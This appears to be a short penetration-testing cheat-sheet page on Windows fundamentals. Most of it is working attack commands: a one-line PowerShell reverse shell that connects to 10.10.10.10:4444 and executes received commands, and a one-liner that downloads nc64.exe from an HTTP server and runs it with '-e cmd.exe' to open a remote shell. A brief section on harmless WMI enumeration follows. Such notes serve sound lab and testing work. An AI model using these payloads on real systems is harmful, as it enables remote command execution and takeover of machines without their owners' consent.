---
description: fundamentals
---

# 🪟 Windows

## Reverse shell (nishang)

* one line tcp powershell

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

* Netcat way

```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.16.69:8000/nc64.exe','C:\Windows\Temp\nc64.exe');Start-Process -FilePath 'C:\Windows\Temp\nc64.exe' -ArgumentList '10.10.16.69','4444','-e','cmd.exe' -NoNewWindow
```

## Get-WmiObject

*   Find os version and build version

    ```bash
    Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber
    ```
* &#x20;`Win32_Process` to get a process listing, `Win32_Service` to get a listing of services, and `Win32_Bios` to get `BIOS` information





